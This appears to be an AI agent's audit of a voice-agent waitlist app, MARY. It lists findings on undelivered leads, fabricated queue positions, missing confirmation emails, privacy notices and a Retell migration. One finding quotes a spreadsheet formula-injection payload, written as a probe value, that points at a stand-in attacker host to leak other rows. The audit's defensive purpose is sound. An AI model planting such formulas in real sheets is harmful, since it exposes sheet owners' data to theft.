findings.user_impact: Old error copy sits on top of the conversation and hides MARY's caption on small phones.
findings.recommendation: Clear missedHold and suggestTyping in send() and at the start of each turn.

findings.title: The gap register the docs rely on is not in the repo
findings.evidence: CLAUDE.md:7 and PROJECT-STATE.md:60 point to docs/audit/GAP-REGISTER.md, and retell-migration.md cites VA-01…VA-10, AI-04 and D2 from it. `git log --all -- docs/audit` returns nothing and the file exists on no branch.
findings.user_impact: There is no way to check which known reliability gaps are still open, and the Retell plan's 'what this fixes' list cannot be checked.
findings.recommendation: Commit docs/audit/ (register + area files) or remove the references. Add the findings above to it with status.

leads.summary: I traced a lead from start to finish: MARY's checked fields (mary-grounding.ts), then LeadLifecycle (it saves to the browser first, sends an in-progress copy 5 s after the last field change, sends the final save, and fires a beacon when the tab is hidden or closed), then /api/lead, the Apps Script sheet, the end screen and the owner view. I checked the behaviour by driving the local build with mocked APIs through 8 scenarios, and I fetched the live /api/lead status and bundle. Evidence is in scratchpad/ux-audit/leads/. That used 0 paid AI calls and sent 0 lead POSTs to the live site. Verdict: the live site delivers no leads today. GET /api/lead still returned {"configured":false} at 2026-09-26 03:10 UTC, three days after the conference. Meanwhile every visitor sees "Early access confirmed" with a made-up position number. Even after the sheet is connected, leads can still be lost or corrupted in several ways: the final save is sent once and never retried, the email is asked last, emails are not validated, no confirmation email is sent, nobody is alerted when a lead or callback arrives, visitors on a shared device or with storage blocked end up writing to someone else's row, and repeat sign-ups become duplicates. Retell fixes MARY saying "it's saved" before anything is saved, and it adds signed, retried webhooks and a lasting call history. It does not give leads a home, send confirmations or alerts, or change the email-last order. The Retell plan's webhook also writes nothing when the sheet is not configured, so those guarantees have to be go-live gates.

findings.title: The live site delivers zero leads: the Google Sheet is still not connected
findings.evidence: GET https://omnisuite.omnikom.io/api/lead at 2026-09-26T03:10:39Z -> {"configured":false} (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/leads/get-api-lead.txt). src/routes/api/lead.ts:20,54-72: when not configured nothing is written and the payload is not even logged. PROJECT-STATE.md:64 has listed setting SHEETS_WEBAPP_URL/SECRET as pending since 2026-09-23, the conference day (.claude/POSITION.md 'conference is TODAY'). The owner view's own copy says 'entries stay on each visitor's device' (src/components/waitlist-vault.tsx:94).
findings.user_impact: Every conversation since launch, including the 2026-09-23 conference, exists only in the localStorage of whichever phone had it. Visitors' own phones can't be reached, and no server log or database holds the leads. The owner has 0 leads and doesn't know it.
findings.recommendation: Today: set SHEETS_WEBAPP_URL and a non-empty SHEETS_WEBAPP_SECRET in Lovable, Publish -> Update, confirm GET /api/lead returns configured:true, reachable:true, then run one real call and watch the row appear. If a booth or demo device was used, open the owner view on it now (Ctrl/Cmd+Shift+O, or 5 taps on 'omnikom') and Export CSV. Safari wipes script-written storage after 7 days without interaction (WebKit ITP, https://webkit.org/blog/10218/full-third-party-cookie-blocking-and-more/). Add an uptime or CI check that fails when production reports configured:false.

findings.title: Visitors are told they're confirmed with a made-up position number, whether or not anything was saved
findings.evidence: Local build, /api/lead mocked the way live answers. Unconfigured: 'EARLY ACCESS CONFIRMED ... Early access position #149' (.../ux-audit/leads/unconfigured-end-later.png). #149 is positionFor(sessionId), frozen at the first local save (src/lib/waitlist-store.ts:122-125,134). The payload sent localPosition 156, which is positionFor(email) (lead-lifecycle.ts:72; unconfigured.json). Two sign-ups by the same person showed #690 and then #250 (again.json). With a 500: 'Your details are saved. Your position comes with the confirmation.' (lead500-end-later.png; end-screen.tsx:100). With a 12 s hang: 'Securing your place…' followed by the same 'saved' line (leadhang-end-*.png). Callback with a 500: 'Your request is with the Omnikom team ... The team receives your request straight away' (callback500-end-later.png; text.ts:69-71). Callbacks never show a sync state (end-screen.tsx:71 checks signed_up only). The live bundle contains the same code (`128+t%640` and both strings in /assets/routes-DZfdjxLS.js). The spec says 'Only say it's recorded after it actually saved' (docs/mary-voice.md:338), but the CALLBACK FINAL TURN prompt (mary-prompt.server.ts:112) has her say it's with the team before finalize() posts anything.
findings.user_impact: While the sheet is off, every visitor leaves believing they hold a numbered spot ('Invitations go out in order of position', text.ts:90). Nobody will contact them, and they have no reason to try again. After the sheet is connected, any failed save still looks like a success.
findings.recommendation: lead-lifecycle.ts:124-132: map !configured and failed to an honest state. end-screen.tsx: show a position only when sync==='sheet'. For failed or local, show 'Saving didn't go through yet — retrying' plus the retry outbox from the next finding, and if it still fails, a prefilled mailto fallback. Remove positionFor from the UI path entirely. Handle the callback branch the same way. Make MARY's final callback line depend on the save result, or change it to 'I'm sending this to the team now'.

findings.title: A failed final save is sent once and never retried
findings.evidence: finalize() posts once (src/features/mary/conversation/lead-lifecycle.ts:116-123) and sets finished=true (line 100). After that, flush() returns early (line 146) and the pagehide beacon never resends. The checkpoint is a trailing debounce (lines 88-93), so in lead500.json the only /api/lead POST of the whole conversation was the final one at t=21.9 s. Measured causes of failure: the per-IP limit of 20/min (api-guard.ts:24) returned 429 from the 21st POST in a minute (.../ux-audit/leads/schema-probe.out.json); the Worker gives the sheet 9 s (lead.ts:63), but the Apps Script can wait up to 25 s for its lock (Code.gs:127).
findings.user_impact: One 429, 5xx, timeout or offline blip at the end of a call loses the finished status and whatever arrived in the last turns. That is often the email, which is asked last. The visitor is still told it saved. Conference Wi-Fi, where many visitors share one IP, and bursts of people finishing together make this more likely.
findings.recommendation: Add a localStorage outbox. Queue every payload, delete it only on saved:true, retry with backoff while the page is open, send it with sendBeacon on pagehide, and replay it on the next load. Upserts by sessionId are already idempotent (Code.gs:173). Key the /api/lead rate limit by sessionId, or raise it, because a venue shares one IP. Turn the checkpoint into a throttle with a maximum wait instead of a pure debounce.

findings.title: The email is asked last, so anyone who leaves early is an uncontactable row
findings.evidence: Phase order is DISCOVER -> REVEAL -> LANES -> CONTACT (src/lib/mary-prompt.server.ts:118-125). The canonical worked example has 5 visitor answers before 'best email?' (docs/mary-voice.md:437-459). In a mocked session that left after 2 answers, both the checkpoint and the abandoned beacon carried name and business but email:'' and phone:'' (.../ux-audit/leads/leave.json).
findings.user_impact: Someone who drops out at answer 1-5 (a loud floor, audio trouble, being pulled away) leaves a name and a company and no way to reach them. That row isn't a lead.
findings.recommendation: Ask for the email right after the name and the first discovery beat (e.g. 'So I can hold your spot while we talk — best email?'), or add an optional 'Leave your email' field that is visible from the first turn and writes through SET_COLLECTED. The reveal still works when the email is already known. Add a unit test that pins the phase order.

findings.title: MARY promises a confirmation email that is never sent
findings.evidence: There is no email-sending code in src/ (grep for resend|sendgrid|postmark|smtp|MailApp finds nothing). MARY asks 'So I know where to send your early-access confirmation — best email?' (docs/mary-voice.md:193,509) and answers 'Only to confirm your spot and send your launch details' (mary-voice.md:386). The Retell plan's fallback line tells visitors 'the team will confirm by email' (scratchpad/retell/plan.md:491).
findings.user_impact: The visitor never gets the promised confirmation and has nothing in their inbox to find the product again. A misheard email is never caught, because nothing is ever sent that could bounce. With voice-captured emails, that is the main way leads quietly die.
findings.recommendation: Send a confirmation the first time a row reaches signed_up or callback. The simplest place is Apps Script MailApp inside upsertLead, which already detects that transition (Code.gs:218-224). The quota is 100 recipients/day on a consumer account and 1,500 on Workspace (https://developers.google.com/apps-script/guides/services/quotas, updated 2026-09-03). Alternatively send it from the Worker through a transactional email provider. Include the captured details and 'reply to fix anything'. Show 'Check your inbox' on the end screen.

findings.title: Emails are never validated or read back, and the domain part isn't checked
findings.evidence: The schema is email: z.string().max(200) (src/lib/lead-sync.ts:21), and the local /api/lead accepted 'sam at example' (.../ux-audit/leads/schema-probe.out.json). Grounding accepts the whole value when only the local part appears in anything the visitor said (mary-grounding.ts:301-302: local.length >= 2 && squashed.includes(local)). If the visitor said 'Sam', any 'sam@<made-up domain>' passes. The Retell argument schema is the same arg(200) (src/lib/retell-shared.ts:149). The spec shows a read-back in one example (mary-voice.md:461), but no rule requires it. Retell ships an email-spelling prompt pattern (https://docs.retellai.com/build/prompt-situation-guide).
findings.user_impact: A wrong or invented email is shown as 'Details confirmed' and stored, and the lead can't be reached. The only way to fix it is 'Start another conversation', which creates a duplicate row.
findings.recommendation: Require a format like x@y.tld and require the domain tokens to appear in what the visitor said (in groundCollected and in the lead schema). A value that fails goes back to MARY as rejected so she asks again. Add a spelled read-back rule for email and phone to the CONTACT phase. Add a 'Fix a detail' action on the end screen that edits the same sessionId row.

findings.title: Nobody is told when a lead arrives, callbacks included
findings.evidence: The owner view reads only this browser's localStorage (src/components/waitlist-vault.tsx:57) plus the sheet's row count (lines 61-97). There is no notification code, and Code.gs only writes rows and an Activity log (Code.gs:233). Callback copy promises 'The team receives your request straight away' (text.ts:71). Retell's alerting only watches totals: 'It isn't built for reacting to a single call' (https://docs.retellai.com/features/alerting-overview).
findings.user_impact: A visitor who asked to be called back waits on a sheet nobody may open for days. Speed-to-lead is the product's own pitch.
findings.recommendation: In Code.gs upsertLead, on the first change to 'Callback requested' or 'On the waitlist', send the owner an email with MailApp, or post to a Slack incoming webhook with UrlFetchApp. Include name, phone/email, business, the summary and a link to the row. Add a daily digest of in-progress or abandoned rows that have contact details.

findings.title: Retell path: save_lead and the webhook still need a durability guarantee
findings.evidence: Retell webhooks time out after 10 s and are retried up to 3 times, then dropped; Retell's docs say to return 2xx only 'as soon as you have safely accepted the payload' (https://docs.retellai.com/features/webhook-overview). The plan's webhook gives the sheet 7 s and returns 502 on failure (scratchpad/retell/plan.md:536-538). When no sheet is configured it returns 204 and writes nothing. Dedupe is per isolate (plan.md:1131). save_lead writes the sheet only at final or callback (plan.md:526). Retell keeps call history indefinitely by default (https://docs.retellai.com/accounts/data-retention), and its list-calls API accepts filter_criteria (https://docs.retellai.com/api-references/list-calls).
findings.user_impact: If the sheet is down for longer than Retell's retry window, or isn't configured, voice leads exist only in Retell's dashboard and nobody notices.
findings.recommendation: Make these go-live gates: (1) refuse VOICE_PROVIDER=retell unless /api/lead reports configured and reachable. (2) Upsert keyed by sessionId (falling back to retell_<call_id>) so save_lead, call_ended, call_analyzed and retries all land on one row. (3) Add a reconciliation job (a scheduled task or a retell/reconcile.ts script) that lists the agent's calls since the last run and upserts any that are missing from the sheet. (4) Set Retell data retention to at least 30 days so Retell is the durable backup. (5) Fire the owner alert and the confirmation email from that same upsert. (6) Drive the end screen from the save_lead result.

findings.title: The next person on a shared device inherits the previous visitor's details and overwrites their row
findings.evidence: Mocked run: visitor 1 gave a name and business and walked off. After a reload, visitor 2 ('Hi, I am Jordan') started with the pills already showing 'Sam Rivera · Rivera Homes · Real estate' (.../ux-audit/leads/kiosk-visitor2-call.png). The turn request carried visitor 1's collected fields, and visitor 2's lead POST reused sessionId w_muhtl1aw_0v9hdi with a new 128-character transcript (kiosk.json). Causes: progress is restored for the sessionStorage id (mary-app.tsx:467-474; waitlist-store.ts:98-109), and Code.gs overwrites the Transcript cell (Code.gs:216). The same mechanism means a single visitor who reloads mid-call replaces their earlier transcript in the row.
findings.user_impact: On a booth or demo tablet, rows merge: visitor 1's name ends up on visitor 2's conversation. Every earlier visitor's personal data also stays readable in that device's owner view, with no expiry.
findings.recommendation: Restore only if the entry was updated in the last ~10 minutes, and ask 'Continue as Sam?' before reusing it. In Code.gs, append transcript parts instead of overwriting. Add ?kiosk=1, which clears local entries after each finish and after an idle timeout.

findings.title: Visitors whose browser blocks storage all share one row named 'session'
findings.evidence: sessionId() returns the literal 'session' when storage throws (src/lib/waitlist-store.ts:99,107). Two mocked visitors with blocked storage (Ana, Ben) both posted sessionId 'session' (.../ux-audit/leads/blocked-storage.json). Code.gs upserts by session (Code.gs:173), so the last one to write wins.
findings.user_impact: Each such visitor overwrites the previous one's details. This happens with Chrome's 'block all cookies' setting and in some embedded or in-app browsers.
findings.recommendation: Fall back to an in-memory crypto.randomUUID() per page load instead of a constant.

findings.title: The same person gets several rows and several positions
findings.evidence: 'Start another conversation' calls newSession() (mary-app.tsx:591-595). A mocked repeat sign-up with the same email created sessions w_muhtlv7k_9ipkvx and w_muhtmdwe_i92y27, shown as positions #690 and #250 (.../ux-audit/leads/again.json, again-second-end.png). Code.gs deduplicates by session only (Code.gs:173) and hands out a new position for every row (Code.gs:220-224).
findings.user_impact: Counts and positions inflate, the team may contact the same person twice, and the visitor sees a different number each time.
findings.recommendation: In Code.gs, normalise the email and, when a signed_up or callback row arrives with an email that already holds a position, reuse that position and record the extra session id. The 'Fix a detail' flow on the end screen replaces 'start over' as the way to correct details.

findings.title: Anyone can write rows into the sheet, including formulas
findings.evidence: The guard lets requests with no Origin through, by design for beacons (src/lib/api-guard.ts:44-49). /api/lead accepted the name '=HYPERLINK("https://evil.example/?"&C2,"click")' (.../ux-audit/leads/schema-probe.out.json). The repo's Code.gs writes cells with setValues and appendRow (Code.gs:227-229), and Apps Script's docs say that for setValues, 'If a value begins with =, it's interpreted as a formula' (https://developers.google.com/apps-script/reference/spreadsheet/range, updated 2026-08-19). SHARED_SECRET defaults to an empty string (Code.gs:27).
findings.user_impact: Once the sheet is connected, a script can flood it with fake sign-ups (each one takes a real position). It can also plant formulas that run in the owner's account when they open the sheet and send other rows to an outside server.
findings.recommendation: In setIf, prefix any value starting with = + - @ with an apostrophe. Require a non-empty secret. Accept only sessionIds in this site's w_ format and issue a per-session token at Start (decision D4). Rate-limit per session.

findings.title: One over-long field makes the server reject the whole lead
findings.evidence: The local /api/lead returned 400 for operations of 401 characters, business 201, name 121 and transcript 60,001 (.../ux-audit/leads/schema-probe.out.json; lead-sync.ts:20-27; lead.ts:48-51). Turn input allows 600 characters per field (mary.functions.ts:96), and the model's operations output has no limit (mary-prompt.server.ts:33). Every checkpoint, the final save and the beacon repeat the same field, so they all fail. This is unlikely: the one live sample of operations was 70 characters (ux-audit/conversation logs).
findings.user_impact: A talkative visitor's entire lead is silently dropped; the client doesn't log the 400.
findings.recommendation: Truncate instead of rejecting in LeadPayloadSchema (.transform(v => v.slice(0, cap)), as src/lib/retell-shared.ts:66 already does), and log a warning on the server.

findings.title: There is no funnel data, so you can't see where people drop off
findings.evidence: The only analytics is Lovable's flock.js page_hit (live HTML: <script defer src="/~flock.js" data-proxy-url="/~api/analytics">, saved at .../ux-audit/leads/flock.js). There are no product events in src/ (grep for analytics|gtag|posthog finds nothing). A session with zero answers never creates a row (lead-lifecycle.ts:148 `turns < 1`), checkpoints fire only when a field changes (lead-lifecycle.ts:79-94), and mic denials and transcription failures are never recorded. flock.js already exposes window.Tinybird.trackEvent(action, payload), which masks email and phone keys.
findings.user_impact: You can't answer how many people tapped Start, granted the mic, answered once, gave an email or finished. So you can't tell whether audio, the opening or the email ask is losing people.
findings.recommendation: Send about 8 events: landing_view, start_voice or start_typed, mic_granted or mic_denied, first_answer, field_captured, email_captured, wrap, outcome. Use window.Tinybird?.trackEvent, or a small /api/event route that writes to Cloudflare Analytics Engine. Also send an in_progress row at Start and add a 'Furthest step' column to the sheet.

findings.title: The Apps Script that is deployed is not the one in the repo
findings.evidence: PROJECT-STATE.md:64: 'Hardened Apps Script (rewritten, not Lovable's) deployed ... ping ok (version 2026-09-23)'. The repo copy, docs/google-sheets/Code.gs, is VERSION '2026-09-22' (line 39) with SHARED_SECRET '' (line 27). docs/audit is excluded from git (PROJECT-STATE.md:63) and not present in this checkout.
findings.user_impact: Whoever next follows docs/google-sheets/README.md redeploys the weaker script, and nobody can review the code that actually receives the leads.
findings.recommendation: Commit the deployed script, without secrets, to docs/google-sheets/Code.gs. Have GET /api/lead check the ping version against an expected constant.

findings.title: There is no privacy notice where details are collected, and Retell will add stored recordings
findings.evidence: No privacy, terms or consent copy in landing.tsx, site-frame.tsx or call-stage.tsx (grep). Each row stores name, email, phone, full transcript, user agent, referrer and timezone (Code.gs:43-72). The Retell plan ships data_storage_setting 'everything' and lists disclosure as an open question (scratchpad/retell/plan.md:981,1139). Retell keeps data indefinitely unless a retention period is set (https://docs.retellai.com/accounts/data-retention).
findings.user_impact: Business visitors ask where their data goes, and MARY's scripted answer (mary-voice.md:388) is about the product, not this conversation. Having no notice at all can block legal sign-off for EU or California visitors.
findings.recommendation: Add one line under Start: 'MARY records this conversation to set up your early access. Privacy →', linking a short policy (what is kept, where — Google Sheet and Retell — how long, and who to contact to delete it). Set a Retell retention period (e.g. 90 days).

findings.title: A callback request can't finish without a phone number
findings.evidence: endingFor() requires name and phone before a callback can end (src/features/mary/conversation/text.ts:54), but the spec also puts 'emailed instead' under CALLBACK (docs/mary-voice.md:299).
findings.user_impact: A visitor who says 'just email me' and won't give a number keeps getting asked for one and never reaches an end state.
findings.recommendation: Let a callback end with name plus email or phone, and show 'We'll email you' on the end screen.

market.summary: I compared MARY's landing, call, typing and end screens (landing.tsx, call-stage.tsx, composer.tsx, end-screen.tsx, mary-app.tsx, text.ts) with what the leading voice agents do as of September 2026. The comparison covers ElevenLabs (changelogs from Aug 24 to Sep 21 2026, plus captures of its consent screen and in-call screen), Vapi and Sesame (captured live on 2026-09-26), Retell (SDK 3.0.1 published 2026-09-08, the 2026-09-30 deprecations, agent settings, pricing, concurrency limits and the Jun–Aug 2026 changelog), OpenAI GPT-Live-1 (2026-09-10) and Hume. MARY already matches or beats the market on several points, so none of the findings below cover them: live word-by-word captions with a 'Show conversation' panel, clear turn cues (orb states and a status line), a 'Type instead' option that is always there, the 'two minutes' expectation on the landing page (the happy-path worked example comes to about 2.2–2.6 minutes), progress pills showing what she has captured, memory of returning visitors, and a screen-reader live region. The gaps are the table-stakes controls every competitor ships: there is no way to end the call and no notice about recording or data use before the mic opens. The first impression is slow: 4.4 s of silence from the tap to her first word, against about 1.7 s for ElevenLabs. The sign-up confirmation is not honest yet: she promises an email that is never sent, and the position number is made up while the Sheet is not connected. For Retell, I recommend building on SDK 3.x now, because 2.x and /v2/create-web-call are deprecated on 2026-09-30. The migration has to deliberately keep three things Retell does not give by default: live captions (in 3.x they need a key with Call.Write), the progress pills with an email readback you can correct, and the typing fallback. Retell's own settings also need MARY-specific values: silence and call-length limits, a 'lines busy' state for the 20-call concurrency default, and filler speech while save_lead runs. I made no live AI calls.

findings.title: No way to end the call: every leading voice UI has a one-tap hang-up
findings.evidence: src/features/mary/ui/call-stage.tsx:142-176: the header holds only the talk-mode and voice toggles. The reducer has no end action (src/features/mary/conversation/reducer.ts:35-92): FINISH comes only from lead.finalize, when MARY decides the call is over (text.ts:51-59). Competitors: ElevenLabs /agents puts a hang-up button in the middle of the orb (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/browser/during-agents-ios.png, captured 2026-09-23). Vapi's live demo shows an end-call button next to a timer (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/market/shots/vapi-demo-10s-ios.png, 2026-09-26), and its widget's end-button-text defaults to 'End Call' (https://docs.vapi.ai/chat/web-widget). The Retell SDK 3.0.1 README says 'await call.end(); // leaving is what ends a web call' (npm, 2026-09-08).
findings.user_impact: A visitor who is done, got interrupted, or is unhappy can only close the tab. They never see the end screen, never confirm what was saved, and never get the 'no pressure' exit. The call just stops, which feels like a trap for a voice product and adds to abandonment.
findings.recommendation: Add an 'End' control to the CallStage header on every breakpoint, as an icon plus label at 44px or larger, next to the voice toggle. When pressed: stop speech, close the mic and call lead.finalize with the current state. If an email is already collected, go to the end screen with 'Want me to save what you told me?'. Otherwise go to the declined screen, which has 'Keep talking' (end-screen.tsx:104-122). With Retell, wire the same button to call.end() and let the call_ended webhook finalize the sheet row.

findings.title: No notice about recording, AI processing or privacy before the mic opens
findings.evidence: The live landing captured by this lens (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/market/shots/mary-live-landing-ios.png) has 0 links and no text matching privacy/record/consent/terms. landing.tsx:139-165 and site-frame.tsx:30-49 have no notice either. Tapping Start requests the mic at once (mary-app.tsx:517-525). Transcripts go to the sheet and to /api/reflect, which stores 'lessons' (mary-app.tsx:95-119). What competitors do: ElevenLabs requires a notice 'immediately prior to any interaction' covering both AI and recording (https://elevenlabs.io/docs/eleven-agents/legal/disclosure-requirement), and its own demo shows an 'I agree' sheet (18+, AI, recorded, privacy policy) at /tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/browser/terms-agents-ios.png. Sesame links its Terms and Privacy before the call (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/market/shots/sesame-ios.png). Vapi's widget has require-consent. EU AI Act Art. 50 transparency applies from 2026-08-02, and 11 US states require all-party consent to recording (https://justcall.io/blog/ai-voice-agent-disclosure-laws.html, updated 2026-09-22). Retell's data_storage_setting defaults to 'everything', meaning recordings are kept (https://docs.retellai.com/api-references/create-agent).
findings.user_impact: Careful B2B visitors, who are the qualified leads MARY wants, get no signal about what happens to their voice and details. Once Retell is live, calls are recorded by default with no notice, which is a legal exposure in all-party-consent states and the EU.
findings.recommendation: Put one quiet line under the Start/Type buttons in landing.tsx, for example: 'MARY is an AI. Your conversation is recorded and transcribed to set up your spot. Privacy.' Link a real privacy page from SiteFooter. Keep the AI mention in her opener (retell-shared.ts:38-42 already says 'AI Revenue Concierge'). Do not add a blocking modal, because the inline line keeps the one-tap start. With Retell, set data_storage_setting to 'everything_except_pii' (or add pii_config at +$0.01/min per https://www.retellai.com/pricing) and make sure the wording matches what Retell stores.

findings.title: 4.4 s of silence after 'Start talking' because the opener is generated by the LLM; ElevenLabs speaks in about 1.7 s
findings.evidence: The funnel lens measured the first word revealed 4433 ms after the tap on the live site (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/funnel/log-voice-ios.json). The /api/turn welcome returned its 'say' at 2.98 s (funnel/turn-welcome.ndjson), and the first TTS audio came 1.28 s after the speech request (funnel/speech-welcome.timing). welcome() runs a full LLM turn (src/features/mary/conversation/turn-runner.ts:52-54), even though fixed openers already exist (src/lib/retell-shared.ts:38-42). The opener also runs 22 words before her question. For comparison, ElevenLabs' demo, captured through the same proxy, went from the mic request to its first agent audio in about 1.75 s (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/browser/log-agents-ios.json: getUserMedia t=13947, audio_event t=15693), using a static 12-word greeting that ends in a question.
findings.user_impact: The most fragile moment of a voice product is right after the tap. For more than 4 s the visitor sees 'Thinking… hold to talk' and hears nothing, so many will wonder whether it is broken or whether their volume is up. The late start also pushes the first real exchange (her name question) to about 12 s after the tap.
findings.recommendation: Do this now: make turn 1 a canned line picked from OPENING_LINES (or a shorter one ending in 'What should I call you?'). Ship its audio as pre-rendered static files (3 MP3s on the CDN, so there is no per-visit TTS cost) and play them from the Start tap. Let /api/turn start working on turn 2 context in parallel. Target: first audible word under 1 s. With Retell, use a static begin message (or the opening_line dynamic variable with begin_message_delay_ms=0) and never an LLM-generated first turn.

findings.title: She promises an 'early-access confirmation' email that is never sent
findings.evidence: The playbook line 'So I know where to send your early-access confirmation — best email?' appears at docs/mary-voice.md:193, 459 and 509, and the prompt at src/lib/mary-prompt.server.ts:125 ties the email to the spot confirmation. end-screen.tsx:100 says 'Your position comes with the confirmation.' A grep for resend/sendgrid/MailApp/GmailApp across src/ and docs/google-sheets/Code.gs finds nothing, so no email is sent anywhere. Best practice: 'Send the email immediately, because an inbox confirmation is what makes it feel real' (https://21st.dev/blog/react-waitlist-page-components, 2026-08-20). Confirmation emails see 75–90% open rates, subject 'You're on the list' (https://getlaunchlist.com/blog/waitlist-email-templates-that-get-opened, updated 2026-04-24). Sesame keeps call summaries in the thread (WinBuzzer, 2026-05-29).
findings.user_impact: Every signed-up visitor is told to expect an email that never arrives. That undoes the trust MARY builds in the call, and it removes the only proof of sign-up and the one channel for a follow-up (a referral or an invite).
findings.recommendation: Send a short confirmation from the existing Apps Script when a row first becomes signed_up. MailApp works in docs/google-sheets/Code.gs with no new vendor. Include the name, what they joined, the real position and one next step. With Retell, trigger it from the call_analyzed webhook and use Retell's call_summary to add a two-line 'what you told MARY' recap. Until that is live, change the copy: MARY should ask for the email 'so we can reach you when early access opens', not promise a confirmation.

findings.title: The 'Early access position #N' shown to visitors is a hash of their email while the Sheet is not connected
findings.evidence: positionFor() returns 128 + hash % 640 (src/lib/waitlist-store.ts:122-126). When the sheet is not configured, the end screen shows that number (src/features/mary/conversation/lead-lifecycle.ts:124-125 → end-screen.tsx:91), and CLAUDE.md says SHEETS_WEBAPP_URL is not set. The steps then state 'Invitations go out in order of position' (conversation/text.ts:90). An example is shown in the screenshot /tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/funnel/shots/convo-ios-22-end-full.png ('#327'). Best practice is a real confirmation that 'states what they signed up for and when to expect something' (https://21st.dev/blog/react-waitlist-page-components, 2026-08-20).
findings.user_impact: Right now visitors are shown a precise, invented queue number and told invitations follow it, while the lead exists only in their own localStorage. If they come back or compare with a colleague, the number means nothing. A fake-looking number is a trust breaker for a sales product.
findings.recommendation: Show a position only when the sheet returns one (sync === 'sheet' and a numeric position). Otherwise use honest copy such as 'You're on the list — we'll email you when early access opens' and drop the 'order of position' step. With Retell, have save_lead return the sheet's real position so MARY can say it out loud (retell-migration.md:52-55 already plans this).

findings.title: Retell SDK 3.x: live captions are off by default and need a key with Call.Write, so the migration can silently lose MARY's captions and transcript panel
findings.evidence: The retell-client-js-sdk 3.0.1 README (npm, published 2026-09-08, saved at /tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/market/retell-sdk-readme.md) says: '`transcript: true` also streams the transcript... it needs a key with `Call.Write`, which a public key scoped to web calls alone won't have, so it is off by default.' retell-migration.md:56 assumes 'the live transcript from SDK transcript events'. retell-shared.ts:23 already has a transcriptKey field. MARY relies on captions for its word-by-word line (call-stage.tsx:15-29, 237-243), for the 'Show conversation' panel (call-stage.tsx:259-268), for the screen-reader live region (call-stage.tsx:182) and for the fallback 'My voice didn't come through just now. The words are on screen.' (composer.tsx:339-341). The market treats captions as the default: ElevenLabs switched widget transcript_enabled and mic_muting_enabled to true by default on 2026-08-24 (https://elevenlabs.io/docs/changelog/2026/8/24), Vapi's show-transcript defaults to true, and ChatGPT voice shows a live transcript in the chat (MacRumors, 2025-11-26).
findings.user_impact: If the Retell build ships with a web-call-only public key, the screen shows an orb and nothing to read. Deaf and hard-of-hearing visitors, people in loud rooms and iPhone users whose audio fails all lose the thing that currently saves those calls.
findings.recommendation: Make captions an explicit acceptance criterion in build slice 1. Choose one way to get them: (a) a second, narrowly scoped key for the transcript stream (the planned transcriptKey), checked against Retell's key scopes; or (b) relaying transcript updates from the server through /api/retell/call-status. Do not put a broad Call.Write key in the page. Keep word-by-word reveal only where Retell gives timing; otherwise reveal a whole utterance on agent_stop_talking.

findings.title: Build the Retell path on SDK 3.x now: 2.x and /v2/create-web-call are deprecated on 2026-09-30, and 3.0.1 answers the design doc's open questions
findings.evidence: Deprecation notice: 'Browser JS SDK v2 … Upgrade to SDK 3.x, replace RetellWebClient with RetellClient … Also deprecates POST /v2/create-web-call' on 09/30/2026 (https://docs.retellai.com/deprecation-notice/overview). The 3.0.1 README (2026-09-08) lists onAgentStartTalking/onAgentStopTalking (for the orb), an 'audio' event with emitRawAudioSamples (for the level), mute()/unmute(), end(), startAudioPlayback() to be called from a click (https://docs.retellai.com/deploy/web-call), and optional reCAPTCHA v3 on the public key. retell-migration.md:113-117 still lists these as VERIFY, and its flow (lines 38-42) mints tokens on the server, whereas 3.x RetellClient is public-key plus domain-allowlist and skips src/lib/api-guard.ts.
findings.user_impact: Building on RetellWebClient or startCall would ship on a deprecated path that is removed in 4.0, forcing a second migration. Choosing the public-key flow without reCAPTCHA leaves the paid voice minutes open to scripted abuse.
findings.recommendation: Update retell-migration.md to target RetellClient.createWebCall. Drive the orb from onAgentStart/StopTalking plus the audio level. Map startAudioPlayback() onto the existing iPhone 'Can't hear her? Play sound' button (composer.tsx:320-338). Either enable reCAPTCHA v3 on the public key or keep server-side creation through /api/retell/web-call behind api-guard, and document which one is used.

findings.title: Hold-to-talk is the default, while the market standard is an open mic you can interrupt
findings.evidence: The initial talkMode is 'hold' (src/features/mary/conversation/reducer.ts:17). The hold button is a full-width 64px bar (composer.tsx:83) that takes over the phone screen (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/funnel/shots/convo-ios-15-progress-pills.png). ElevenLabs, Vapi and Sesame demos all run an open mic (captures listed above). GPT-Live-1 (GA 2026-09-10) is full-duplex with 'almost 80% fewer interruptions' (https://www.testingcatalog.com/openai-launches-gpt-live-1-for-full-duplex-voice-agents/). Retell exposes interruption_sensitivity, responsiveness, enable_dynamic_responsiveness, and denoising_mode 'noise-and-background-speech-cancellation' (https://docs.retellai.com/api-references/create-agent) at +$0.005/min (https://www.retellai.com/pricing).
findings.user_impact: Hold-to-talk makes the experience feel like a walkie-talkie rather than a phone call. Visitors have to learn a gesture, keep a finger on the screen and remember to let go, and 'Didn't catch that' notices follow a missed hold. That weakens the 'talk to her like a person' promise on the landing page.
